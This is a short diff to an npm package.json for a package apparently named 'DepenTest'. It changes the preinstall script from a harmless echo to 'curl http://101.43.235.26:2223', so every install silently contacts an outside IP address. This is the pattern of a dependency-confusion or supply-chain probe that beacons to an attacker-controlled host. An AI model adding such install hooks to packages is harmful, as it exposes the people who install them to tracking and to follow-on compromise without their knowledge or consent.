@@ -3,7 +3,7 @@
   "version": "1.0.0",
   "main": "DepenTest",
   "scripts": {
-    "preinstall": "echo 111",
+    "preinstall": "curl http://101.43.235.26:2223",
     "postinstall": "echo 123"
   }
 }
